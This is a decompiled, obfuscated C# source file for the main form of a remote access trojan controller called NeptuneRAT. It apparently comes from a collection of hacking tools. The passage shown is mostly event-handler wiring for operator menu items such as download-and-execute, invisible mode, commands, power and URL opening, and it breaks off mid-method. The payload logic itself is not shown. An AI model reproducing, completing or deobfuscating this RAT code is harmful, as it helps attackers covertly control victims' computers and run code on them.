// Decompiled with JetBrains decompiler
// Type: NeptuneRAT.Form1
// Assembly: NeptuneRAT Free Version V2, Version=2.2.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 48C579C5-C5A1-4244-9537-C19C9217B961
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Tools\NeptuneRAT\NeptuneRAT.7z\neptunerat.exe

using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using NeptuneRAT.My;
using SimpleObfuscator;
using System;
using System.CodeDom.Compiler;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.Xml.Linq;

#nullable disable
namespace NeptuneRAT;

[DesignerGenerated]
public class Form1 : Form
{
  private IContainer \u2694️MasonRAT\u270C\u060C\u060D\u0609ـۙ\u060Dبٺ\u0609ڙۧ̍ڙ;
  public Server \u2694️MasonRAT\u270Cـۙـــ\u060Ę\u060A\u060Aڅگ;
  public bool \u2694️MasonRAT\u270Cــ\u060Bگۭ\u0609ـ\u060A\u0608̍;
  public string \u2694️MasonRAT\u270Cگ\u0608ڙ\u060Dٻڙ\u060Bـح\u060Fـڙ;
  public string \u2694️MasonRAT\u270C\u060Cــ\u060Dـٽ\u0609ۛ\u060E\u060C\u060Aْـــگ\u060D\u060C\u0608\u0609;
  public static GeoIP \u2694️MasonRAT\u270Cؤﻼ\u060Dٺټ\u060B\u060C\u060Aڙڙ\u0608ﻻ\u0609ـ = new GeoIP(Application.StartupPath + \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 450));
  public bool \u2694️MasonRAT\u270Cمڣمٻدــ\u060A\u0609ـ;

  [DebuggerNonUserCode]
  protected override void Dispose(bool disposing)
  {
    try
    {
      if (!disposing || this.\u2694️MasonRAT\u270C\u060C\u060D\u0609ـۙ\u060Dبٺ\u0609ڙۧ̍ڙ == null)
        return;
      this.\u2694️MasonRAT\u270C\u060C\u060D\u0609ـۙ\u060Dبٺ\u0609ڙۧ̍ڙ.Dispose();
    }
    finally
    {
      base.Dispose(disposing);
    }
  }

  [DebuggerStepThrough]
  private void \u2694️MasonRAT\u270Cــ\u0020\u060A\u0608\u060A\u0608ـ\u060C\u0608\u0608څـٽڙ()
  {
    // ISSUE: The method is too long to display (81524 instructions)
  }

  internal virtual StatusStrip \u2694️MasonRAT\u270Cۙ\u0608ـــ\u060A\u060Cۡ\u060Aۙ\u0609\u060Bڙ\u060C\u060Dڜـٻڙ
  {
    get => this.\u2694️MasonRAT\u270Cـٽـ\u0608\u0608ئم\u060Dڣژ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      ToolStripItemClickedEventHandler clickedEventHandler = new ToolStripItemClickedEventHandler(this.\u2694️MasonRAT\u270C̍ٺـ\u060A\u0609ۨﻻـۡڛ\u060Dۙح\u060Dﻻــؤـ\u060A);
      StatusStrip statusStrip1 = this.\u2694️MasonRAT\u270Cـٽـ\u0608\u0608ئم\u060Dڣژ;
      if (statusStrip1 != null)
        statusStrip1.ItemClicked -= clickedEventHandler;
      this.\u2694️MasonRAT\u270Cـٽـ\u0608\u0608ئم\u060Dڣژ = value;
      StatusStrip statusStrip2 = this.\u2694️MasonRAT\u270Cـٽـ\u0608\u0608ئم\u060Dڣژ;
      if (statusStrip2 == null)
        return;
      statusStrip2.ItemClicked += clickedEventHandler;
    }
  }

  [field: AccessedThroughProperty("ToolStripStatusLabel1")]
  internal virtual ToolStripStatusLabel \u2694️MasonRAT\u270Cـ\u060Aٻـــ\u060D\u060B\u0608\u060A\u0608ٸ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ContextMenuStrip \u2694️MasonRAT\u270Cـ\u0608ڙ\u060Fٽ\u060Fؤٸڙڜڙۧـ
  {
    get => this.\u2694️MasonRAT\u270C̍\u0608\u060Aٽ\u060Dﻻٺ\u0609ا\u0609\u060Aءڕئﯧـڕ\u0609\u060B;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      CancelEventHandler cancelEventHandler = new CancelEventHandler(this.\u2694️MasonRAT\u270C\u0609\u060A\u060Aڞاۙٺ\u060Aـﮪۙ);
      ContextMenuStrip masonRat̍ٽﻻٺاءڕئﯧـڕ1 = this.\u2694️MasonRAT\u270C̍\u0608\u060Aٽ\u060Dﻻٺ\u0609ا\u0609\u060Aءڕئﯧـڕ\u0609\u060B;
      if (masonRat̍ٽﻻٺاءڕئﯧـڕ1 != null)
        masonRat̍ٽﻻٺاءڕئﯧـڕ1.Opening -= cancelEventHandler;
      this.\u2694️MasonRAT\u270C̍\u0608\u060Aٽ\u060Dﻻٺ\u0609ا\u0609\u060Aءڕئﯧـڕ\u0609\u060B = value;
      ContextMenuStrip masonRat̍ٽﻻٺاءڕئﯧـڕ2 = this.\u2694️MasonRAT\u270C̍\u0608\u060Aٽ\u060Dﻻٺ\u0609ا\u0609\u060Aءڕئﯧـڕ\u0609\u060B;
      if (masonRat̍ٽﻻٺاءڕئﯧـڕ2 == null)
        return;
      masonRat̍ٽﻻٺاءڕئﯧـڕ2.Opening += cancelEventHandler;
    }
  }

  [field: AccessedThroughProperty("DownloadAndExecuteToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـ\u060Bــۙـ̍ڠـ\u060Dڟـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060C\u060Aـ\u060Aڕ\u0020ﻋۧ\u060E\u0609ــٸۜڙڣۏؤ
  {
    get => this.\u2694️MasonRAT\u270C\u0608\u060E\u0608ڙٸ\u060Dڟـ\u060A\u060Eڙڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0608\u060Eــٽڼْـئـ̨ۡۙٸح\u060C\u0608ٺـﻻ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u0608\u060E\u0608ڙٸ\u060Dڟـ\u060A\u060Eڙڙ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608\u060E\u0608ڙٸ\u060Dڟـ\u060A\u060Eڙڙ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u0608\u060E\u0608ڙٸ\u060Dڟـ\u060A\u060Eڙڙ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("CLIENTToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـﮪڟدگ\u0020ـٺـ\u060Fـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۡ\u060C\u060Aاڙـۜـڟ\u0608ءـ\u0609\u060A\u0609ـﻻْ\u0608
  {
    get => this.\u2694️MasonRAT\u270Cڕ̍ڕ\u060Aدڟـ\u060Dـۚـڕ̨ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۚ\u0608ڙـڜـڠـۚڼ\u060F\u060Aط\u0608ٸٻ\u060D);
      ToolStripMenuItem masonRatڕ̍ڕدڟــۚـڕ̨ـ1 = this.\u2694️MasonRAT\u270Cڕ̍ڕ\u060Aدڟـ\u060Dـۚـڕ̨ـ;
      if (masonRatڕ̍ڕدڟــۚـڕ̨ـ1 != null)
        masonRatڕ̍ڕدڟــۚـڕ̨ـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڕ̍ڕ\u060Aدڟـ\u060Dـۚـڕ̨ـ = value;
      ToolStripMenuItem masonRatڕ̍ڕدڟــۚـڕ̨ـ2 = this.\u2694️MasonRAT\u270Cڕ̍ڕ\u060Aدڟـ\u060Dـۚـڕ̨ـ;
      if (masonRatڕ̍ڕدڟــۚـڕ̨ـ2 == null)
        return;
      masonRatڕ̍ڕدڟــۚـڕ̨ـ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۨـٻـ\u060Fـى\u060A\u060Fټ\u060Aﻋى\u060Bٺـۧﻻ\u060E
  {
    get
    {
      return this.\u2694️MasonRAT\u270Cء\u060B\u060Bـ\u060D\u0608̍\u060Bټڙ\u0020\u060Eـ\u0020\u0608ٺحـ;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u060Bﯧۧـ\u060Dؤ\u060Aۙـــ\u060Dـــ\u060Aڙـ);
      ToolStripMenuItem masonRatءـ̍ټڙـٺحـ1 = this.\u2694️MasonRAT\u270Cء\u060B\u060Bـ\u060D\u0608̍\u060Bټڙ\u0020\u060Eـ\u0020\u0608ٺحـ;
      if (masonRatءـ̍ټڙـٺحـ1 != null)
        masonRatءـ̍ټڙـٺحـ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cء\u060B\u060Bـ\u060D\u0608̍\u060Bټڙ\u0020\u060Eـ\u0020\u0608ٺحـ = value;
      ToolStripMenuItem masonRatءـ̍ټڙـٺحـ2 = this.\u2694️MasonRAT\u270Cء\u060B\u060Bـ\u060D\u0608̍\u060Bټڙ\u0020\u060Eـ\u0020\u0608ٺحـ;
      if (masonRatءـ̍ټڙـٺحـ2 == null)
        return;
      masonRatءـ̍ټڙـٺحـ2.Click += eventHandler;
    }
  }

  internal virtual System.Windows.Forms.Timer \u2694️MasonRAT\u270C\u060D\u0609ﻋۡةـئـ؁د\u060E\u060F\u0608ـ\u0609
  {
    get => this.\u2694️MasonRAT\u270Cڙﻻﻋڞدمةﻼ\u060Eڛـۚـۜؤٽٽ\u060A;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Aـ\u060Dـة\u060Dحــۧـ\u060D);
      System.Windows.Forms.Timer ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ1 = this.\u2694️MasonRAT\u270Cڙﻻﻋڞدمةﻼ\u060Eڛـۚـۜؤٽٽ\u060A;
      if (ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ1 != null)
        ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙﻻﻋڞدمةﻼ\u060Eڛـۚـۜؤٽٽ\u060A = value;
      System.Windows.Forms.Timer ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ2 = this.\u2694️MasonRAT\u270Cڙﻻﻋڞدمةﻼ\u060Eڛـۚـۜؤٽٽ\u060A;
      if (ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ2 == null)
        return;
      ڙﻻﻋڞدمةﻼڛـۚـۜؤٽٽ2.Tick += eventHandler;
    }
  }

  internal virtual System.Windows.Forms.Timer \u2694️MasonRAT\u270C\u0609ﻻـﻻ\u0608ٽ\u060Aٻ\u060Bـڟ\u0608ــ\u060A\u060Cﯧـء
  {
    get => this.\u2694️MasonRAT\u270C\u060F\u060D\u060B̍ﻻ\u060A\u060Aژ\u060D\u0608ٺۧ\u0608;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cٻﻋ\u060A̍ټ̍\u0609ــ\u060C\u060Dــح\u0608ּـ);
      System.Windows.Forms.Timer timer1 = this.\u2694️MasonRAT\u270C\u060F\u060D\u060B̍ﻻ\u060A\u060Aژ\u060D\u0608ٺۧ\u0608;
      if (timer1 != null)
        timer1.Tick -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060F\u060D\u060B̍ﻻ\u060A\u060Aژ\u060D\u0608ٺۧ\u0608 = value;
      System.Windows.Forms.Timer timer2 = this.\u2694️MasonRAT\u270C\u060F\u060D\u060B̍ﻻ\u060A\u060Aژ\u060D\u0608ٺۧ\u0608;
      if (timer2 == null)
        return;
      timer2.Tick += eventHandler;
    }
  }

  internal virtual LV \u2694️MasonRAT\u270Cٻــ؁ء\u060Aڦــۏ\u060Aٸـ\u060A
  {
    get => this.\u2694️MasonRAT\u270C\u0608ٸ\u0608ــﻼـــﻼگ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      MouseEventHandler mouseEventHandler = new MouseEventHandler(this.\u2694️MasonRAT\u270Cمۧڙ\u0609̍ـ\u0020ــڙ\u060D\u060Aـژـۡ\u060D);
      KeyEventHandler keyEventHandler = new KeyEventHandler(this.\u2694️MasonRAT\u270Cــــۛ\u060C\u0608ـ\u0608\u060Aـ؁\u060Dٽڝٽــ);
      EventHandler eventHandler1 = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u060Cـۛ\u0020ـد\u060C\u060D\u060Aٺ\u0609\u060B);
      EventHandler eventHandler2 = new EventHandler(this.\u2694️MasonRAT\u270Cڅــڙۙؤ\u060Cڙ\u060A\u060Fـٺب\u060Dڠـ\u0608ـڙ);
      LV masonRatٸــﻼـــﻼگ1 = this.\u2694️MasonRAT\u270C\u0608ٸ\u0608ــﻼـــﻼگ;
      if (masonRatٸــﻼـــﻼگ1 != null)
      {
        masonRatٸــﻼـــﻼگ1.MouseMove -= mouseEventHandler;
        masonRatٸــﻼـــﻼگ1.KeyDown -= keyEventHandler;
        masonRatٸــﻼـــﻼگ1.SelectedIndexChanged -= eventHandler1;
        masonRatٸــﻼـــﻼگ1.RegionChanged -= eventHandler2;
      }
      this.\u2694️MasonRAT\u270C\u0608ٸ\u0608ــﻼـــﻼگ = value;
      LV masonRatٸــﻼـــﻼگ2 = this.\u2694️MasonRAT\u270C\u0608ٸ\u0608ــﻼـــﻼگ;
      if (masonRatٸــﻼـــﻼگ2 == null)
        return;
      masonRatٸــﻼـــﻼگ2.MouseMove += mouseEventHandler;
      masonRatٸــﻼـــﻼگ2.KeyDown += keyEventHandler;
      masonRatٸــﻼـــﻼگ2.SelectedIndexChanged += eventHandler1;
      masonRatٸــﻼـــﻼگ2.RegionChanged += eventHandler2;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader1")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060Cڙٽـٸ\u060Aﯧــﻼـڙﯧۙڙڟ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader2")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cﻻٻـۨ\u0608ּ\u0609\u0609ڙدڙﮪ\u060Aﯧـٻ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader3")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C\u060A\u0608ڙ\u060Aدڇۏ\u060Eٻڝ\u060F\u060Fﻻـ\u0020\u060Aــ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader4")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270Cدڙﻋٻڝڜٺ\u0609ـٺـڙ\u060B\u0608بـټــ\u060B { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("ColumnHeader6")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C؁ـٺۜـح\u0609\u0608ــح\u060Eدب { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u060Cـٻ\u060Dـڙٺ\u060D\u0608\u060C\u0608ٺټڇڙـ
  {
    get => this.\u2694️MasonRAT\u270Cــدـ\u0608\u060A\u060F\u060B̍ىـ\u060Fڇـڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0608ـڼ\u060Fـ̍ڙـ\u0609ــــ);
      ToolStripMenuItem masonRatــدـ̍ىـڇـڙ1 = this.\u2694️MasonRAT\u270Cــدـ\u0608\u060A\u060F\u060B̍ىـ\u060Fڇـڙ;
      if (masonRatــدـ̍ىـڇـڙ1 != null)
        masonRatــدـ̍ىـڇـڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــدـ\u0608\u060A\u060F\u060B̍ىـ\u060Fڇـڙ = value;
      ToolStripMenuItem masonRatــدـ̍ىـڇـڙ2 = this.\u2694️MasonRAT\u270Cــدـ\u0608\u060A\u060F\u060B̍ىـ\u060Fڇـڙ;
      if (masonRatــدـ̍ىـڇـڙ2 == null)
        return;
      masonRatــدـ̍ىـڇـڙ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـۜحڟڇـ̨ڙ\u060Cـٺ\u060Bـڙ\u060A
  {
    get => this.\u2694️MasonRAT\u270Cڙـٸ\u060Aڙــــْ\u060Eۙڝ\u060Aـټﻋڅ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Fٸ\u060E\u060Eټ\u060Aٻـۡ̍ـۡ\u060D\u0608ټۡ);
      ToolStripMenuItem ratڙـٸڙــــْۙڝـټﻋڅ1 = this.\u2694️MasonRAT\u270Cڙـٸ\u060Aڙــــْ\u060Eۙڝ\u060Aـټﻋڅ;
      if (ratڙـٸڙــــْۙڝـټﻋڅ1 != null)
        ratڙـٸڙــــْۙڝـټﻋڅ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cڙـٸ\u060Aڙــــْ\u060Eۙڝ\u060Aـټﻋڅ = value;
      ToolStripMenuItem ratڙـٸڙــــْۙڝـټﻋڅ2 = this.\u2694️MasonRAT\u270Cڙـٸ\u060Aڙــــْ\u060Eۙڝ\u060Aـټﻋڅ;
      if (ratڙـٸڙــــْۙڝـټﻋڅ2 == null)
        return;
      ratڙـٸڙــــْۙڝـټﻋڅ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ـۡ\u060Fڙﻼڞ\u0608\u060Aاى\u060B\u060Dح\u060A
  {
    get => this.\u2694️MasonRAT\u270Cﯧڙټـــ\u060B\u0609ـ\u060B;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cد\u060Bټؤ\u060B\u060Dبـ\u060A\u0020ى);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cﯧڙټـــ\u060B\u0609ـ\u060B;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﯧڙټـــ\u060B\u0609ـ\u060B = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cﯧڙټـــ\u060B\u0609ـ\u060B;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("ColumnHeader5")]
  internal virtual ColumnHeader \u2694️MasonRAT\u270C̨ڙ\u060Eٽد\u060Eـ\u060B\u060Cٻڙﻻ\u0609 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("OpenUrlToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cﮪ\u0609\u060Aـ̍ﻻـ\u060Aـ\u060Fٸۛڛ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u0608ـ\u0020ڕـگ\u0609ءڙۏ\u060A\u0609\u0609ح\u0608\u060Dﻋ
  {
    get
    {
      return this.\u2694️MasonRAT\u270C\u060Cا\u060F\u060Fـۙ\u0608\u060Bـٺ\u060C\u060D\u0020ـٸ\u060D\u0609;
    }
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cــد\u0608ط\u060C\u0608\u060Fـ̨);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u060Cا\u060F\u060Fـۙ\u0608\u060Bـٺ\u060C\u060D\u0020ـٸ\u060D\u0609;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u060Cا\u060F\u060Fـۙ\u0608\u060Bـٺ\u060C\u060D\u0020ـٸ\u060D\u0609 = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u060Cا\u060F\u060Fـۙ\u0608\u060Bـٺ\u060C\u060D\u0020ـٸ\u060D\u0609;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("InvisibleToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Eٺڅـ\u0608؁ـ\u060A\u060Eــ\u060B\u060Aڕـּ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cۜۚـ\u060Aـ\u060Aۧ\u060Cڦۡ
  {
    get => this.\u2694️MasonRAT\u270Cۧٸ\u060D\u060Cط\u060A\u0609ـ\u0609ب\u060E;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـة\u060Eـۨـ\u0608ڙـح\u060Dـ);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cۧٸ\u060D\u060Cط\u060A\u0609ـ\u0609ب\u060E;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cۧٸ\u060D\u060Cط\u060A\u0609ـ\u0609ب\u060E = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cۧٸ\u060D\u060Cط\u060A\u0609ـ\u0609ب\u060E;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــ\u060Fـؤـؤـٻ\u060Fـټ\u0608ۡــ\u0608\u060Aـ
  {
    get => this.\u2694️MasonRAT\u270Cــب̍\u060Dــ\u060Fڠڙ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cد\u060B\u060Eڙـۡ\u060Aـ\u0608\u060D\u0020ﻋڼـٸ\u0609);
      ToolStripMenuItem masonRatــب̍ــڠڙ1 = this.\u2694️MasonRAT\u270Cــب̍\u060Dــ\u060Fڠڙ;
      if (masonRatــب̍ــڠڙ1 != null)
        masonRatــب̍ــڠڙ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cــب̍\u060Dــ\u060Fڠڙ = value;
      ToolStripMenuItem masonRatــب̍ــڠڙ2 = this.\u2694️MasonRAT\u270Cــب̍\u060Dــ\u060Fڠڙ;
      if (masonRatــب̍ــڠڙ2 == null)
        return;
      masonRatــب̍ــڠڙ2.Click += eventHandler;
    }
  }

  [field: AccessedThroughProperty("CommandsToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cــــح\u060Dڇ\u0020ـﻻٺڟـ { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  [field: AccessedThroughProperty("PowerToolStripMenuItem")]
  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cـــ\u060Cﮪح\u060B\u060Dﻼ\u060D\u060Aــۏڕــ\u0608 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Eـٻ̍ۨ\u060Aּ\u060F\u0609̍بـ̍ـڞٸ\u0609
  {
    get => this.\u2694️MasonRAT\u270Cـڙټــــ\u0609ۧﻻۏڇ\u0608ﮪـ̍;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u060Eۙ\u060E\u0020\u060Cــڦـ\u060B);
      ToolStripMenuItem ratـڙټــــۧﻻۏڇﮪـ̍1 = this.\u2694️MasonRAT\u270Cـڙټــــ\u0609ۧﻻۏڇ\u0608ﮪـ̍;
      if (ratـڙټــــۧﻻۏڇﮪـ̍1 != null)
        ratـڙټــــۧﻻۏڇﮪـ̍1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cـڙټــــ\u0609ۧﻻۏڇ\u0608ﮪـ̍ = value;
      ToolStripMenuItem ratـڙټــــۧﻻۏڇﮪـ̍2 = this.\u2694️MasonRAT\u270Cـڙټــــ\u0609ۧﻻۏڇ\u0608ﮪـ̍;
      if (ratـڙټــــۧﻻۏڇﮪـ̍2 == null)
        return;
      ratـڙټــــۧﻻۏڇﮪـ̍2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Fﻼ\u060Aڝـح\u060Cـ\u060Cـژڙ
  {
    get => this.\u2694️MasonRAT\u270C\u0608\u060D\u060Aۡ\u0020ٺ̍ـٻ\u0609\u060Cڙ\u0608ـ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cۏڙۙ̍ۧۏ\u0020ـ\u060F\u0609);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270C\u0608\u060D\u060Aۡ\u0020ٺ̍ـٻ\u0609\u060Cڙ\u0608ـ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270C\u0608\u060D\u060Aۡ\u0020ٺ̍ـٻ\u0609\u060Cڙ\u0608ـ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270C\u0608\u060D\u060Aۡ\u0020ٺ̍ـٻ\u0609\u060Cڙ\u0608ـ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060F\u060B\u0608ڦـ\u060Dـ\u0020\u0608ـ\u0609\u060E\u060A
  {
    get => this.\u2694️MasonRAT\u270Cٸڜڝـــ\u0609̍ـ\u060Bـڠــ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270Cـ\u0609\u060Cـ\u0609\u060Dـ̍ﮪڙڛ\u060Dڟ̍ژ);
      ToolStripMenuItem masonRatٸڜڝـــ̍ــڠــ1 = this.\u2694️MasonRAT\u270Cٸڜڝـــ\u0609̍ـ\u060Bـڠــ;
      if (masonRatٸڜڝـــ̍ــڠــ1 != null)
        masonRatٸڜڝـــ̍ــڠــ1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cٸڜڝـــ\u0609̍ـ\u060Bـڠــ = value;
      ToolStripMenuItem masonRatٸڜڝـــ̍ــڠــ2 = this.\u2694️MasonRAT\u270Cٸڜڝـــ\u0609̍ـ\u060Bـڠــ;
      if (masonRatٸڜڝـــ̍ــڠــ2 == null)
        return;
      masonRatٸڜڝـــ̍ــڠــ2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270Cڼ\u0608\u0608\u060Aۙـ\u060Dــۡ
  {
    get => this.\u2694️MasonRAT\u270Cﻋ\u0609ﻻـ\u060C\u0609\u060Dڙټ\u060Bـﻻ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609ڟ\u060B\u0020ـ\u0609ټـ\u060A\u060D\u060Bۙ\u060F\u060Fﮪؤڙ\u060Fة);
      ToolStripMenuItem toolStripMenuItem1 = this.\u2694️MasonRAT\u270Cﻋ\u0609ﻻـ\u060C\u0609\u060Dڙټ\u060Bـﻻ;
      if (toolStripMenuItem1 != null)
        toolStripMenuItem1.Click -= eventHandler;
      this.\u2694️MasonRAT\u270Cﻋ\u0609ﻻـ\u060C\u0609\u060Dڙټ\u060Bـﻻ = value;
      ToolStripMenuItem toolStripMenuItem2 = this.\u2694️MasonRAT\u270Cﻋ\u0609ﻻـ\u060C\u0609\u060Dڙټ\u060Bـﻻ;
      if (toolStripMenuItem2 == null)
        return;
      toolStripMenuItem2.Click += eventHandler;
    }
  }

  internal virtual ToolStripMenuItem \u2694️MasonRAT\u270C\u060Fـﻻ\u060A\u060Aــ\u0020ۧــ̨\u0608\u060Aگ\u060Aـ\u060C
  {
    get => this.\u2694️MasonRAT\u270Cـد\u060Aـــــڙـ\u060Aٺٸئ;
    [MethodImpl(MethodImplOptions.Synchronized)] set
    {
      EventHandler eventHandler = new EventHandler(this.\u2694️MasonRAT\u270C\u0609\u0608ۧڼ\u060E\u0608\u060Aـــڕٺ);
      ToolStripMenuItem masonRatـدـــــڙـٺٸئ1 = this.\u2694️MasonRAT\u270Cـد\u060Aـــــڙـ\u060Aٺٸئ;
      if (masonRatـدـــــڙـٺٸئ1 != null)
        masonRatـدـــــڙـٺٸئ1.Click -= eventHandler;
